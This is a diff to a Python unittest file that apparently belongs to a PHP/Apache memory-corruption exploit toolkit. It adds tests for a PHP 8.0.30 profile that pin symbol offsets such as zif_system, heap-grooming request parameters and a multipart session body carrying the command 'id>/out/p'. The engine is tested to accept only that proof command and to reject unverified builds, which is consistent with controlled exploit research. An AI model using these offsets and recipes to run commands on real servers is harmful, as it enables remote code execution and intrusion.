@@ -34,6 +34,7 @@ from profile_tool import command_calibrate, command_manifest  # noqa: E402
 
 PROFILE_PATH = ROOT / "profiles" / "php-8.4.26-apache-amd64-fixed.json"
 PHP81_PROFILE_PATH = ROOT / "profiles" / "php-8.1.34-apache-amd64-trans-sid.json"
+PHP80_PROFILE_PATH = ROOT / "profiles" / "php-8.0.30-apache-amd64-trans-sid.json"
 PURE_PROFILE_PATH = ROOT / "profiles" / "php-8.2.34-apache-amd64-pure-http-oom.json"
 
 
@@ -318,6 +319,56 @@ class PureHttpOomProfileTests(unittest.TestCase):
         self.assertEqual(body[ht + 0x98:ht + 0x98 + 9], b"id>/out/p")
         with self.assertRaisesRegex(ProfileError, "fixed uid proof"):
             PureHttpOomExploit(mock.Mock(), self.profile, b"uname -a")
+
+
+class Php80TransSidProfileTests(unittest.TestCase):
+    def setUp(self) -> None:
+        self.profile = load_profile(PHP80_PROFILE_PATH)
+
+    def test_complete_profile_is_verified_and_exact(self) -> None:
+        require_verified(self.profile)
+        raw = self.profile.raw
+        self.assertEqual(self.profile.strategy, "php81-trans-sid-v1")
+        self.assertEqual(raw["build"]["php"]["version"], "8.0.30")
+        self.assertEqual(raw["runtime"]["memory_limit"], "108M")
+        self.assertEqual(raw["symbols"]["zif_system"]["offset"], "0x3495d0")
+        self.assertEqual(raw["symbols"]["zval_ptr_dtor"]["offset"], "0x4319a0")
+        self.assertEqual(raw["request_recipe"]["a1"]["file"]["filename_len"], 245760)
+        self.assertEqual(raw["request_recipe"]["b1"]["fake_len"], "0x400000")
+        self.assertEqual(raw["request_recipe"]["a2"]["fillers"]["count"], 64)
+        self.assertEqual(raw["request_recipe"]["b2"]["session_value"], "a")
+        self.assertEqual(raw["request_recipe"]["b2"]["reference_offset"], "0x7d960")
+        self.assertEqual(raw["request_recipe"]["b2"]["fake_array_offset"], "0x7d800")
+
+    def test_php80_bounds_fail_closed(self) -> None:
+        data = json.loads(PHP80_PROFILE_PATH.read_text(encoding="utf-8"))
+        data["runtime"]["memory_limit"] = "109M"
+        with self.assertRaisesRegex(ProfileError, "exact 108M/192M/192M/1000 runtime"):
+            validate_profile(data)
+
+        data = json.loads(PHP80_PROFILE_PATH.read_text(encoding="utf-8"))
+        data["request_recipe"]["a1"]["file"]["filename_len"] = (1 << 20) + 1
+        with self.assertRaisesRegex(ProfileError, "a1.file.filename_len"):
+            validate_profile(data)
+
+        data = json.loads(PHP80_PROFILE_PATH.read_text(encoding="utf-8"))
+        data["request_recipe"]["b1"]["fake_len"] = "0x900000"
+        with self.assertRaisesRegex(ProfileError, "within four chunks"):
+            validate_profile(data)
+
+        data = json.loads(PHP80_PROFILE_PATH.read_text(encoding="utf-8"))
+        data["build"]["php"]["version"] = "8.0.31"
+        with self.assertRaisesRegex(ProfileError, "no verified exact-build geometry"):
+            validate_profile(data)
+
+    def test_b2_uses_short_sid_and_fixed_command(self) -> None:
+        engine = Php81TransSidExploit(mock.Mock(), self.profile, b"id>/out/p")
+        body, boundary = engine.build_b2(0x700000000000, 0x700100000000)
+        self.assertEqual(boundary, b"B" * 10)
+        self.assertIn(b'name="PHPSESSID"\r\n\r\na\r\n', body)
+        self.assertIn(b"id>/out/p", body)
+        with self.assertRaisesRegex(ProfileError, "accepts only id>/out/p"):
+            Php81TransSidExploit(mock.Mock(), self.profile, b"uname -a")
 
 
 class Php81TransSidProfileTests(unittest.TestCase):
